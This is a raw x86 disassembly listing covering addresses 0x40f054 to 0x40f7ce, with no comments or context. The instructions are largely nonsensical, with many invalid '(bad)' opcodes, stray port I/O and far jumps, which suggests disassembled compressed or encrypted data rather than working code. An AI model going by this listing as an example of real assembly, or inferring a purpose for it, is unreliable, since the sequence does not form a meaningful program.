  40f054:	cmp    esp,ebx
  40f056:	add    BYTE PTR [edi+0x2fd0148c],dl
  40f05c:	push   esp
  40f05d:	inc    esi
  40f05e:	xchg   ecx,eax
  40f05f:	cdq    
  40f060:	outs   dx,BYTE PTR ds:[esi]
  40f061:	lea    edi,[edx-0x80]
  40f064:	out    0x9,eax
  40f066:	ss inc ecx
  40f068:	inc    esi
  40f069:	sar    DWORD PTR [eax+ecx*2-0x21],cl
  40f06d:	popa   
  40f06e:	mov    gs,esp
  40f070:	push   esp
  40f071:	add    BYTE PTR [eax],0x93
  40f074:	(bad)  
  40f075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f076:	imul   BYTE PTR [ecx-0x43]
  40f079:	ins    DWORD PTR es:[edi],dx
  40f07a:	push   es
  40f07b:	sub    BYTE PTR [esi-0x5a],ch
  40f07e:	jno    0x40f0bd
  40f080:	gs (bad) 
  40f082:	(bad)  
  40f083:	aad    0x7e
  40f085:	into   
  40f086:	sub    edx,esp
  40f088:	fiadd  DWORD PTR [eax]
  40f08a:	xchg   edi,eax
  40f08b:	push   cs
  40f08c:	add    cl,dl
  40f08e:	jg     0x40f0c7
  40f090:	fwait
  40f091:	inc    ebx
  40f092:	fwait
  40f093:	cs in  al,0x30
  40f096:	lock sbb al,0x54
  40f099:	sub    al,0xdf
  40f09b:	xor    al,BYTE PTR [ebx+ebx*8+0x41]
  40f09f:	push   0x65e67da7
  40f0a4:	lea    ebp,[esi+eiz*1-0x5b]
  40f0a8:	lods   al,BYTE PTR ds:[esi]
  40f0a9:	sbb    bl,ah
  40f0ab:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40f0ad:	(bad)  
  40f0ae:	lods   eax,DWORD PTR ds:[esi]
  40f0af:	stos   BYTE PTR es:[edi],al
  40f0b0:	sbb    ecx,DWORD PTR [esi+0x1bbe9f51]
  40f0b6:	xchg   esi,eax
  40f0b7:	inc    BYTE PTR [esi]
  40f0b9:	mov    dh,BYTE PTR [ebx-0x458c36f5]
  40f0bf:	outs   dx,BYTE PTR ds:[esi]
  40f0c0:	test   DWORD PTR [ecx],ecx
  40f0c2:	je     0x40f0b2
  40f0c4:	inc    eax
  40f0c5:	sahf   
  40f0c6:	xor    bl,bh
  40f0c8:	jo     0x40f09b
  40f0ca:	test   DWORD PTR [eax+0xd],eax
  40f0cd:	dec    edi
  40f0ce:	add    DWORD PTR [ecx-0x80],ebx
  40f0d1:	push   es
  40f0d2:	daa    
  40f0d3:	xchg   esi,eax
  40f0d4:	lds    ebx,FWORD PTR [eax]
  40f0d6:	bound  edx,QWORD PTR ss:[ebx+0x63cc418e]
  40f0dd:	adc    eax,0xea77ae0
  40f0e2:	dec    ecx
  40f0e3:	or     edx,eax
  40f0e5:	lahf   
  40f0e6:	inc    eax
  40f0e7:	lods   al,BYTE PTR ds:[esi]
  40f0e8:	jbe    0x40f122
  40f0ea:	test   edi,esp
  40f0ec:	xchg   BYTE PTR [esi+0x3a],al
  40f0ef:	js     0x40f0b1
  40f0f1:	cmp    ch,0xae
  40f0f4:	in     eax,0xf8
  40f0f6:	fldl2t 
  40f0f8:	imul   ecx,ecx,0x47119fba
  40f0fe:	and    eax,0x3de23954
  40f103:	fdivr  QWORD PTR [edi+ebx*8-0x6f89b02b]
  40f10a:	xchg   ecx,eax
  40f10b:	hlt    
  40f10c:	sbb    al,cl
  40f10e:	js     0x40f0da
  40f110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f111:	ds into 
  40f113:	sbb    al,0xc4
  40f115:	inc    ecx
  40f116:	xchg   esi,eax
  40f117:	pop    ds
  40f118:	adc    ecx,DWORD PTR [esi+0x2f]
  40f11b:	xchg   ebx,eax
  40f11c:	add    al,0x61
  40f11e:	cmp    BYTE PTR [eax-0x57aae1c1],bh
  40f124:	in     al,0x7d
  40f126:	jmp    0x40f104
  40f128:	sub    DWORD PTR [ebp+0x16131823],eax
  40f12e:	repz fs fcmovnu st,st(3)
  40f132:	mov    esp,0x6435f4aa
  40f137:	jmp    0xad1:0xea2a0c82
  40f13e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f13f:	aad    0x5b
  40f141:	cmp    DWORD PTR [ecx-0x45e53fe6],0xbeca9764
  40f14b:	fld    QWORD PTR [ebx]
  40f14d:	ret    
  40f14e:	gs add al,0x8e
  40f151:	mov    cl,0x1b
  40f153:	push   ds
  40f154:	dec    ebp
  40f155:	not    BYTE PTR [ebx]
  40f157:	mov    ah,0xfe
  40f159:	mov    eax,0x59f2ec83
  40f15e:	xchg   ebp,eax
  40f15f:	and    eax,0xa838d242
  40f164:	jo     0x40f117
  40f166:	pusha  
  40f167:	push   ss
  40f168:	dec    esp
  40f169:	fs dec ebx
  40f16b:	mov    al,ds:0x72dc6bd7
  40f170:	push   esp
  40f171:	outs   dx,BYTE PTR ds:[esi]
  40f172:	jl     0x40f1a8
  40f174:	xchg   ecx,eax
  40f175:	ds add eax,0x48a13f9a
  40f17b:	sbb    al,0x27
  40f17d:	pushf  
  40f17e:	fwait
  40f17f:	mov    ecx,0xfc164d54
  40f184:	out    dx,eax
  40f185:	loopne 0x40f12c
  40f187:	add    esp,DWORD PTR [esi]
  40f189:	ss test bl,al
  40f18c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f18d:	out    0xa6,al
  40f18f:	dec    edx
  40f190:	mov    edi,0x97818edf
  40f195:	fwait
  40f196:	push   cs
  40f197:	jg     0x40f1e9
  40f199:	fs ins DWORD PTR es:[edi],dx
  40f19b:	sbb    eax,0xc7d051f0
  40f1a0:	sbb    DWORD PTR [ecx],0xb4901d31
  40f1a6:	add    DWORD PTR [edi],ebx
  40f1a8:	push   ds
  40f1a9:	out    dx,eax
  40f1aa:	jmp    0x40f151
  40f1ac:	mov    DWORD PTR [esi],esp
  40f1ae:	xor    BYTE PTR [edi],al
  40f1b0:	sbb    esi,DWORD PTR [ebp+0x7b438ab1]
  40f1b6:	or     edx,DWORD PTR [ebx*4-0x18d49fe8]
  40f1bd:	js     0x40f22b
  40f1bf:	ja     0x40f16f
  40f1c1:	setne  BYTE PTR ds:0x7798d80b
  40f1c8:	sbb    bh,al
  40f1ca:	test   BYTE PTR [edx+0x694e3691],bh
  40f1d0:	fwait
  40f1d1:	push   cs
  40f1d2:	mov    ecx,0x8111a16a
  40f1d7:	cmp    al,0x8a
  40f1d9:	mov    gs,WORD PTR [esi-0x3f3b35d7]
  40f1df:	outs   dx,BYTE PTR ds:[esi]
  40f1e0:	ret    
  40f1e1:	mov    eax,0x3eadd544
  40f1e6:	jne    0x40f1d6
  40f1e8:	int3   
  40f1e9:	fwait
  40f1ea:	lahf   
  40f1eb:	mov    eax,ds:0x1e7d7a02
  40f1f0:	aad    0x1a
  40f1f2:	jne    0x40f261
  40f1f4:	xchg   BYTE PTR [edx-0x4351f5c2],dl
  40f1fa:	mov    esp,0x9811e404
  40f1ff:	pop    ds
  40f200:	sub    esi,DWORD PTR [edx-0x73]
  40f203:	push   esi
  40f204:	cmp    dh,ah
  40f206:	sti    
  40f207:	mov    bl,0x15
  40f209:	dec    esp
  40f20a:	enter  0x8515,0xc5
  40f20e:	xor    al,0x96
  40f210:	stos   DWORD PTR es:[edi],eax
  40f211:	cld    
  40f212:	in     al,dx
  40f213:	nop
  40f214:	pop    ss
  40f215:	or     DWORD PTR [edi-0x44a5a153],edx
  40f21b:	shr    BYTE PTR [eax+0x524272],0xb
  40f222:	fst    DWORD PTR [edi-0x6b]
  40f225:	xor    al,0x60
  40f227:	push   esi
  40f228:	stos   BYTE PTR es:[edi],al
  40f229:	mov    DWORD PTR [ecx+0x37],ebp
  40f22c:	jmp    0x40f1fe
  40f22e:	mov    ebx,0x7e68f10b
  40f233:	mov    ecx,0x6fbc2abc
  40f238:	jno    0x40f231
  40f23a:	adc    dh,bh
  40f23c:	into   
  40f23d:	fisubr WORD PTR ds:0xc5d8eda6
  40f243:	fucomp st(0)
  40f245:	gs dec ebp
  40f247:	rcr    bl,0xed
  40f24a:	stos   DWORD PTR es:[edi],eax
  40f24b:	adc    al,0x6b
  40f24d:	push   0xffffffec
  40f24f:	xchg   ecx,eax
  40f250:	xadd   bh,bl
  40f253:	fwait
  40f254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f255:	cmp    eax,0x529edf4b
  40f25a:	sbb    BYTE PTR [ecx-0x48],dh
  40f25d:	sub    DWORD PTR [ecx],ebp
  40f25f:	mov    bh,0x5e
  40f261:	sub    BYTE PTR [edi],dl
  40f263:	push   edi
  40f264:	pop    edi
  40f265:	jnp    0x40f28c
  40f267:	push   es
  40f268:	xor    BYTE PTR ds:0x1d5ad362,ch
  40f26e:	and    ebx,edi
  40f270:	shl    DWORD PTR [edi+0x70],cl
  40f273:	daa    
  40f274:	dec    eax
  40f275:	pop    eax
  40f276:	call   0x8211:0xc6cbadc0
  40f27d:	fwait
  40f27e:	mov    cl,0x32
  40f280:	nop
  40f281:	cs std 
  40f283:	pop    ebx
  40f284:	aaa    
  40f285:	add    ch,BYTE PTR [edi+esi*8]
  40f288:	call   0x98f3:0x606e20a2
  40f28f:	pop    ebx
  40f290:	fiadd  WORD PTR [ebx-0x5442d653]
  40f296:	int    0x9b
  40f298:	fdiv   DWORD PTR ds:0xe836240e
  40f29e:	add    edi,DWORD PTR [edi]
  40f2a0:	in     eax,dx
  40f2a1:	mov    bl,0x70
  40f2a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2a4:	adc    BYTE PTR [esi-0x1131b997],0xc4
  40f2ab:	jmp    0x40f29e
  40f2ad:	cld    
  40f2ae:	xchg   ebp,eax
  40f2af:	xor    al,0x4b
  40f2b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2b2:	xor    edi,DWORD PTR [ebp+esi*4+0x64]
  40f2b6:	xlat   BYTE PTR ds:[ebx]
  40f2b7:	fisttp QWORD PTR [ebx]
  40f2b9:	out    dx,eax
  40f2ba:	xlat   BYTE PTR ds:[ebx]
  40f2bb:	clc    
  40f2bc:	popa   
  40f2bd:	in     eax,0xd5
  40f2bf:	or     al,cl
  40f2c1:	dec    edi
  40f2c2:	enter  0xd884,0x84
  40f2c6:	push   0xffffffd9
  40f2c8:	add    dh,BYTE PTR [ecx]
  40f2ca:	in     eax,0x81
  40f2cc:	or     al,0xfd
  40f2ce:	jo     0x40f302
  40f2d0:	dec    ebp
  40f2d1:	cmp    bh,BYTE PTR [esi+eax*1]
  40f2d4:	test   BYTE PTR [edx+0x45fbf4bf],cl
  40f2da:	not    BYTE PTR [edx]
  40f2dc:	out    0x59,al
  40f2de:	shl    BYTE PTR ds:0x20d16409,0x94
  40f2e5:	sub    eax,0x65612bd1
  40f2ea:	out    0x2f,al
  40f2ec:	xor    dh,al
  40f2ee:	and    cl,BYTE PTR [edi]
  40f2f0:	(bad)  
  40f2f1:	fbstp  TBYTE PTR [ecx]
  40f2f3:	jb     0x40f340
  40f2f5:	mov    ds:0xb57b7416,eax
  40f2fa:	push   esp
  40f2fb:	outs   dx,BYTE PTR ds:[esi]
  40f2fc:	mov    WORD PTR ds:0x474c7130,gs
  40f302:	xlat   BYTE PTR ds:[ebx]
  40f303:	nop
  40f304:	mov    ds:0x3ef3151d,al
  40f309:	cmc    
  40f30a:	dec    ebx
  40f30b:	scas   eax,DWORD PTR es:[edi]
  40f30c:	mov    dh,0x69
  40f30e:	lock mov dh,0x1f
  40f311:	fdiv   QWORD PTR [ecx]
  40f313:	mov    bl,0x14
  40f315:	(bad)
  40f319:	jne    0x40f37e
  40f31b:	fwait
  40f31c:	xor    eax,0xf4064305
  40f321:	jle    0x40f2f6
  40f323:	ins    DWORD PTR es:[edi],dx
  40f324:	aam    0xd6
  40f326:	or     al,0xf0
  40f328:	xchg   edi,eax
  40f329:	cwde   
  40f32a:	push   ss
  40f32b:	jg     0x40f2b4
  40f32d:	je     0x40f398
  40f32f:	add    eax,0xe579c81f
  40f334:	push   esp
  40f335:	test   eax,0x67beb44
  40f33a:	inc    ecx
  40f33b:	sbb    DWORD PTR [edi+ebp*4-0x26],ecx
  40f33f:	in     al,0xec
  40f341:	mov    al,0x9
  40f343:	mov    DWORD PTR [eax+0x7b],edx
  40f346:	cwde   
  40f347:	cwde   
  40f348:	test   eax,0x25856390
  40f34d:	jecxz  0x40f3aa
  40f34f:	sbb    BYTE PTR [eax],0x83
  40f352:	adc    eax,0x57346372
  40f357:	jg     0x40f361
  40f359:	and    eax,0xec837b81
  40f35e:	mov    al,0x84
  40f360:	mov    ?,WORD PTR [ebp-0x7a]
  40f363:	lahf   
  40f364:	frstor [ecx+eax*2+0x2fc56114]
  40f36b:	aaa    
  40f36c:	mov    ds:0xbf140b7,al
  40f371:	inc    eax
  40f372:	add    BYTE PTR [edi],bh
  40f374:	inc    ecx
  40f375:	mov    eax,ds:0xb08bcbfb
  40f37a:	sub    esp,DWORD PTR [edx+0x42497bd5]
  40f380:	jmp    0x986d:0x784637db
  40f387:	(bad)  
  40f388:	mov    esi,0xff8ed72d
  40f38d:	mul    BYTE PTR [edx+eax*2-0x3f3f3f4e]
  40f394:	mov    edx,DWORD PTR [edx-0x36]
  40f397:	jge    0x40f3ed
  40f399:	pop    ds
  40f39a:	jmp    0xf239:0x4a8f1cb0
  40f3a1:	test   al,0xaa
  40f3a3:	ins    BYTE PTR es:[edi],dx
  40f3a4:	jo     0x40f3f1
  40f3a6:	pusha  
  40f3a7:	shr    DWORD PTR [ebp-0x6e5c0b49],cl
  40f3ad:	push   ds
  40f3ae:	sbb    edi,edx
  40f3b0:	dec    esi
  40f3b1:	push   esi
  40f3b2:	imul   esp,DWORD PTR [ecx+0x436c333a],0x55
  40f3b9:	fld    TBYTE PTR [eax+0x55b5326f]
  40f3bf:	jb     0x40f392
  40f3c1:	jp     0x40f3e1
  40f3c3:	out    dx,eax
  40f3c4:	ret    0xbccd
  40f3c7:	xchg   esp,eax
  40f3c8:	push   esp
  40f3c9:	cmp    eax,0x75c3dac6
  40f3ce:	mov    esi,0xba08eb05
  40f3d3:	pop    edx
  40f3d4:	xchg   edi,eax
  40f3d5:	aaa    
  40f3d6:	(bad)  
  40f3d7:	jecxz  0x40f430
  40f3d9:	lahf   
  40f3da:	pop    esi
  40f3db:	xor    eax,0x3643cec3
  40f3e0:	fcomp  DWORD PTR [edx-0x5bcb2a2e]
  40f3e6:	scas   al,BYTE PTR es:[edi]
  40f3e7:	bound  ebx,QWORD PTR [edi+0x5be72f5c]
  40f3ed:	pop    ecx
  40f3ee:	or     ebx,DWORD PTR [ecx+0x60]
  40f3f1:	lods   al,BYTE PTR ds:[esi]
  40f3f2:	nop
  40f3f3:	inc    edx
  40f3f4:	sbb    ah,BYTE PTR [ecx-0x3a]
  40f3f7:	xchg   esp,eax
  40f3f8:	mov    ds:0x63170728,eax
  40f3fd:	call   0x5e2f797e
  40f402:	mov    ebp,0xa3ad9519
  40f407:	inc    ebx
  40f408:	fisttp DWORD PTR [ebx-0x4a9da4a9]
  40f40e:	mov    ch,0xb8
  40f410:	jl     0x40f3fd
  40f412:	sbb    BYTE PTR [eax+0x5d],cl
  40f415:	cld    
  40f416:	mov    dl,0x74
  40f418:	add    eax,0x6704a107
  40f41d:	mov    BYTE PTR [eax],al
  40f41f:	std    
  40f420:	mov    dh,0x9d
  40f422:	jbe    0x40f476
  40f424:	push   edi
  40f425:	push   edi
  40f426:	hlt    
  40f427:	lahf   
  40f428:	scas   eax,DWORD PTR es:[edi]
  40f429:	jb     0x40f47e
  40f42b:	call   0x86e76a68
  40f430:	sub    al,BYTE PTR [ebp+ecx*8-0x49]
  40f434:	xchg   ecx,eax
  40f435:	push   ds
  40f436:	aam    0x48
  40f438:	push   esp
  40f439:	xchg   ecx,eax
  40f43a:	fidiv  WORD PTR [esi-0x493dba98]
  40f440:	sub    BYTE PTR [ebx+0x5a3da10],bl
  40f446:	mov    dh,BYTE PTR [ebx]
  40f448:	cdq    
  40f449:	or     edx,DWORD PTR [ebx]
  40f44b:	clc    
  40f44c:	pop    esi
  40f44d:	int    0x4a
  40f44f:	inc    esi
  40f450:	jmp    0x1c60f254
  40f455:	pop    edx
  40f456:	sbb    edx,DWORD PTR [edx-0x316d3a77]
  40f45c:	push   0xdd8aa36d
  40f461:	lds    esi,FWORD PTR [ebx+ebx*8+0x6f]
  40f465:	loope  0x40f3f5
  40f467:	and    bl,BYTE PTR [edi-0x110fccf2]
  40f46d:	sub    BYTE PTR [ecx],bl
  40f46f:	out    dx,al
  40f470:	pop    ebx
  40f471:	ret    
  40f472:	out    0xaa,eax
  40f474:	dec    eax
  40f475:	sti    
  40f476:	inc    esp
  40f477:	adc    ch,BYTE PTR [ecx-0x7034fe5f]
  40f47d:	jb     0x40f433
  40f47f:	lods   ax,WORD PTR ds:[esi]
  40f481:	inc    eax
  40f482:	inc    esp
  40f483:	fwait
  40f484:	mov    al,ds:0x7348783c
  40f489:	leave  
  40f48a:	mov    esi,0x443ca2db
  40f48f:	mov    eax,ds:0xd14055f7
  40f494:	pop    edx
  40f495:	mov    DWORD PTR [ecx],eax
  40f497:	pop    ecx
  40f498:	mov    DWORD PTR [esi+0x7928d1fc],ecx
  40f49e:	(bad)  [edi-0x5f]
  40f4a1:	inc    ebx
  40f4a2:	pusha  
  40f4a3:	pop    ds
  40f4a4:	(bad)  
  40f4a5:	hlt    
  40f4a6:	cmp    DWORD PTR [edi+0x79],eax
  40f4a9:	enter  0xb473,0xd1
  40f4ad:	sbb    DWORD PTR [esi],edx
  40f4af:	push   esi
  40f4b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4b1:	out    0x7e,al
  40f4b3:	ficomp DWORD PTR [eax]
  40f4b5:	xchg   DWORD PTR [edi],ebx
  40f4b7:	fnstenv cs:[edi+esi*2+0x60]
  40f4bc:	or     dl,BYTE PTR [edx-0x59ded868]
  40f4c2:	test   al,0xc7
  40f4c4:	or     DWORD PTR [edx+ebx*1],ebp
  40f4c7:	pop    es
  40f4c8:	fld    TBYTE PTR [ecx+0x7a]
  40f4cb:	test   BYTE PTR [esi],dh
  40f4cd:	mov    edx,0x43b8271f
  40f4d2:	ja     0x40f4e4
  40f4d4:	mov    esi,0x21250d00
  40f4d9:	mov    al,ds:0xa977283c
  40f4de:	shl    DWORD PTR ds:0x794b7522,cl
  40f4e4:	and    eax,DWORD PTR [eax+esi*1]
  40f4e7:	(bad)  [esi+0x3a8b8bca]
  40f4ed:	pop    ss
  40f4ee:	sub    ah,dh
  40f4f0:	cli    
  40f4f1:	rcl    DWORD PTR [eax+ebp*2+0x1],cl
  40f4f5:	sbb    al,0x7e
  40f4f7:	out    0x75,al
  40f4f9:	cld    
  40f4fa:	into   
  40f4fb:	call   0x7ea96c4f
  40f500:	sbb    eax,0xf390320f
  40f505:	(bad)
  40f50a:	xchg   edx,eax
  40f50b:	push   ebx
  40f50c:	aas    
  40f50d:	je     0x40f4c2
  40f50f:	aam    0xf0
  40f511:	inc    esi
  40f512:	sbb    esp,edx
  40f514:	mov    esi,0xfd19996b
  40f519:	(bad)  [ecx+0x40]
  40f51c:	repz cmp al,0x2f
  40f51f:	popf   
  40f520:	aad    0x11
  40f522:	jmp    0x40f559
  40f524:	and    al,0x93
  40f526:	std    
  40f527:	jne    0x40f565
  40f529:	push   esp
  40f52a:	(bad)  
  40f52b:	cmp    edx,ecx
  40f52d:	pop    esp
  40f52e:	push   cs
  40f52f:	or     bh,BYTE PTR ds:0x627ab99f
  40f535:	call   0x4f7b:0xffef75ea
  40f53c:	jnp    0x40f5ac
  40f53e:	cmp    edi,0xf9c27886
  40f544:	test   DWORD PTR [eax+0x4d5d0b7e],ebp
  40f54a:	popf   
  40f54b:	jmp    0x432b:0xd3adfbc3
  40f552:	xor    BYTE PTR [ebx],ah
  40f554:	jmp    0x15cd62f1
  40f559:	push   0x5ddd0bcb
  40f55e:	xchg   ebp,eax
  40f55f:	and    esi,DWORD PTR [ebx-0x19]
  40f562:	push   ebp
  40f563:	nop
  40f564:	and    eax,0x4615852d
  40f569:	push   eax
  40f56a:	es cmp al,0xea
  40f56d:	pop    esp
  40f56e:	pop    esp
  40f56f:	pop    esi
  40f570:	ror    DWORD PTR [edi],1
  40f572:	repz pop ecx
  40f574:	sbb    al,dh
  40f576:	ficom  WORD PTR [edx]
  40f578:	xchg   edi,eax
  40f579:	dec    eax
  40f57a:	rcl    BYTE PTR [ecx],0x69
  40f57d:	jbe    0x40f54f
  40f57f:	cld    
  40f580:	shr    ecx,0xdc
  40f583:	sbb    eax,0x27b0121
  40f588:	sahf   
  40f589:	out    dx,eax
  40f58a:	jno    0x40f5af
  40f58c:	adc    DWORD PTR [ecx+0x7d],ebx
  40f58f:	inc    ecx
  40f590:	hlt    
  40f591:	je     0x40f5e0
  40f593:	fidivr WORD PTR [eax+0x4e5a4c2c]
  40f599:	cmc    
  40f59a:	leave  
  40f59b:	sub    esi,DWORD PTR [edi-0x28e8b376]
  40f5a1:	int3   
  40f5a2:	rcr    DWORD PTR [edi+eiz*4],1
  40f5a5:	and    DWORD PTR [edx],eax
  40f5a7:	and    eax,0x9ad38c17
  40f5ac:	or     edx,DWORD PTR [eax-0xe898427]
  40f5b2:	dec    edx
  40f5b3:	lods   al,BYTE PTR ds:[esi]
  40f5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5b5:	jp     0xd696a9f0
  40f5bb:	ror    BYTE PTR [esi+0x3],0x6f
  40f5bf:	pop    edi
  40f5c0:	xlat   BYTE PTR ds:[ebx]
  40f5c1:	dec    esi
  40f5c2:	pop    DWORD PTR [ebx-0x2d]
  40f5c5:	mov    esi,0x7b9f5343
  40f5ca:	pop    esp
  40f5cb:	sub    dl,ch
  40f5cd:	xchg   ecx,eax
  40f5ce:	xor    esp,DWORD PTR [ebp-0x5f25a4c]
  40f5d4:	mov    ds:0x889b1762,al
  40f5d9:	cwde   
  40f5da:	sahf   
  40f5db:	mov    ebx,0xe148861
  40f5e0:	(bad)  
  40f5e1:	ins    BYTE PTR es:[edi],dx
  40f5e2:	imul   esp,DWORD PTR ds:0x3984a967,0x2c9402de
  40f5ec:	push   esp
  40f5ed:	mov    ecx,0x291af3c3
  40f5f2:	jmp    0xaeff:0x4f15497b
  40f5f9:	retf   
  40f5fa:	repz dec ebx
  40f5fc:	shr    BYTE PTR [ebx-0x52],0x45
  40f600:	mov    dh,0x62
  40f602:	adc    BYTE PTR [esi],0x3b
  40f605:	lods   al,BYTE PTR ds:[esi]
  40f606:	push   ebx
  40f607:	(bad)  
  40f609:	in     eax,dx
  40f60a:	jae    0x40f5ca
  40f60c:	repz pop es
  40f60e:	xchg   ecx,eax
  40f60f:	adc    dh,dh
  40f611:	int3   
  40f612:	inc    esi
  40f613:	pop    edx
  40f614:	push   es
  40f615:	jae    0x40f601
  40f617:	lds    ebx,FWORD PTR [esi+0x17]
  40f61a:	rol    BYTE PTR [eax-0x6],0x4c
  40f61e:	bound  ebp,QWORD PTR [ebp+0x60a29503]
  40f624:	ret    0xa695
  40f627:	inc    edx
  40f628:	dec    edx
  40f629:	enter  0x3298,0xe5
  40f62d:	fild   WORD PTR [edi+0x4aa4caf6]
  40f633:	dec    eax
  40f634:	inc    eax
  40f635:	jge    0x40f619
  40f637:	idiv   bl
  40f639:	add    cl,BYTE PTR [ebx]
  40f63b:	push   ebp
  40f63c:	lds    eax,FWORD PTR [edx+0x32]
  40f63f:	pop    ss
  40f640:	jne    0x40f65b
  40f642:	mov    esi,0xaa079cf9
  40f647:	aaa    
  40f648:	fisub  WORD PTR [esi+0x6475d577]
  40f64e:	inc    edx
  40f64f:	and    esi,0xffffff82
  40f652:	pop    ds
  40f653:	enter  0x83f9,0xad
  40f657:	shr    BYTE PTR [ebp-0x1f],1
  40f65a:	mov    al,0x8d
  40f65c:	sub    eax,0xe8ba7640
  40f661:	and    bh,dl
  40f663:	loope  0x40f622
  40f665:	jns    0x40f690
  40f667:	mov    bh,BYTE PTR [edi+0x35]
  40f66a:	sbb    DWORD PTR [edx-0x519d6f08],ecx
  40f670:	sbb    BYTE PTR [ebx+0x67],0xe9
  40f674:	retf   
  40f675:	dec    eax
  40f676:	fcomp  DWORD PTR [esp+edi*8]
  40f679:	jno    0x40f6a2
  40f67b:	pop    ebp
  40f67c:	(bad)  
  40f67d:	fnstenv [esi]
  40f67f:	ret    0x3e83
  40f682:	pop    eax
  40f683:	leave  
  40f684:	fistp  QWORD PTR [edi-0x45]
  40f687:	test   eax,0xa8aecbc2
  40f68c:	ficomp WORD PTR [edi+0x53]
  40f68f:	xchg   ecx,eax
  40f690:	fs in  al,0x3a
  40f693:	xchg   ebx,eax
  40f694:	fs in  eax,0x60
  40f697:	call   0x868273c5
  40f69c:	aad    0x10
  40f69e:	jl     0x40f65a
  40f6a0:	int3   
  40f6a1:	int    0x98
  40f6a3:	clc    
  40f6a4:	ss jb  0x40f65b
  40f6a7:	push   es
  40f6a8:	adc    DWORD PTR cs:[ebp-0x31],esi
  40f6ac:	mov    BYTE PTR [edi],cl
  40f6ae:	scas   al,BYTE PTR es:[edi]
  40f6af:	gs call 0x3384:0x9497a09b
  40f6b7:	xchg   ebx,eax
  40f6b8:	pop    ebx
  40f6b9:	ret    
  40f6ba:	fisub  DWORD PTR [edx]
  40f6bc:	push   es
  40f6bd:	sub    bh,BYTE PTR [ebp+0x7c]
  40f6c0:	push   0x44257455
  40f6c5:	dec    edi
  40f6c6:	outs   dx,DWORD PTR ds:[esi]
  40f6c7:	ficom  WORD PTR [ebx+0x2b]
  40f6ca:	sbb    DWORD PTR [eax],edi
  40f6cc:	fisub  WORD PTR [ebx-0x331dfa32]
  40f6d2:	sbb    DWORD PTR [edx],0x12b53f35
  40f6d8:	cmc    
  40f6d9:	inc    esp
  40f6da:	inc    edx
  40f6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6dc:	out    0xde,al
  40f6de:	dec    edx
  40f6df:	mov    al,ds:0xe8bac4c1
  40f6e4:	call   0x20855641
  40f6e9:	mov    ecx,0xebac64cd
  40f6ee:	xchg   esp,eax
  40f6ef:	add    bh,BYTE PTR [ebx-0x7979fd5]
  40f6f5:	inc    edi
  40f6f6:	shr    bh,cl
  40f6f8:	movq   mm4,mm5
  40f6fb:	mov    ds:0x91dbad8b,eax
  40f700:	xor    eax,0xf21772ca
  40f705:	test   al,0xee
  40f707:	sbb    ah,BYTE PTR [ebp-0x691a1407]
  40f70d:	(bad)  
  40f710:	mov    WORD PTR [ecx],cs
  40f712:	popa   
  40f713:	sub    BYTE PTR [esi-0x1f02bbc0],0xc6
  40f71a:	mov    ah,BYTE PTR [edx-0x1d751615]
  40f720:	out    dx,al
  40f721:	rcl    ebx,1
  40f723:	mov    ch,0xf6
  40f725:	sub    bl,dl
  40f727:	jmp    0x40f774
  40f729:	xchg   esp,eax
  40f72a:	(bad)  
  40f72c:	ds leave 
  40f72e:	inc    ebx
  40f72f:	push   ds
  40f730:	nop
  40f731:	sbb    edx,DWORD PTR [edx-0x5f]
  40f734:	imul   esp,DWORD PTR [ebx],0x3a137cc8
  40f73a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f73b:	retf   
  40f73c:	mov    edx,0xb9e19a9a
  40f741:	cmp    eax,DWORD PTR [esi]
  40f743:	push   cs
  40f744:	aad    0x14
  40f746:	pop    esi
  40f747:	leave  
  40f748:	cmp    BYTE PTR [eax+0x707fc250],bh
  40f74e:	push   ss
  40f74f:	jmp    0x7c3f7812
  40f754:	gs xor eax,0xd2343dbe
  40f75a:	inc    esp
  40f75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f75c:	jns    0x40f6f6
  40f75e:	dec    esp
  40f75f:	imul   bl
  40f761:	pop    edi
  40f762:	shl    BYTE PTR [ebx*2+0x3c197b02],1
  40f769:	mov    cl,0x50
  40f76b:	sub    dl,BYTE PTR ds:[esi+0x6f]
  40f76f:	sahf   
  40f770:	push   edi
  40f771:	jmp    0x40f735
  40f773:	loop   0x40f732
  40f775:	dec    esp
  40f776:	iret   
  40f777:	ficom  DWORD PTR ds:0x54281296
  40f77d:	jo     0x40f73c
  40f77f:	icebp  
  40f780:	adc    edx,DWORD PTR [edi-0x396bb5e]
  40f786:	xchg   esp,eax
  40f787:	dec    edi
  40f788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f789:	xor    DWORD PTR cs:[ecx+0x7b79abee],edx
  40f790:	imul   edi,DWORD PTR [eax-0x48],0xffffffa7
  40f794:	sbb    BYTE PTR [ebx-0x51],cl
  40f797:	inc    esi
  40f798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f799:	or     BYTE PTR [esi+0x5c],ah
  40f79c:	jns    0x40f751
  40f79e:	(bad)  
  40f79f:	jae    0x40f7a1
  40f7a1:	jns    0x40f7db
  40f7a3:	retf   0xcdf
  40f7a6:	pop    esi
  40f7a7:	jg     0x40f74b
  40f7a9:	shl    ch,0x4e
  40f7ac:	pop    edx
  40f7ad:	ins    BYTE PTR es:[edi],dx
  40f7ae:	into   
  40f7af:	into   
  40f7b0:	test   eax,0x8089d518
  40f7b5:	inc    esi
  40f7b6:	lea    ebp,[ecx+0x4b]
  40f7b9:	jmp    0x599cccab
  40f7be:	and    bh,dh
  40f7c0:	xchg   edi,eax
  40f7c1:	mov    cs,WORD PTR [edi]
  40f7c3:	push   es
  40f7c4:	mov    esi,0x263c6529
  40f7c9:	test   DWORD PTR [edi],ebx
  40f7cb:	ins    BYTE PTR es:[edi],dx
  40f7cc:	mov    ah,0x50
  40f7ce:	add    eax,0x771c25fd
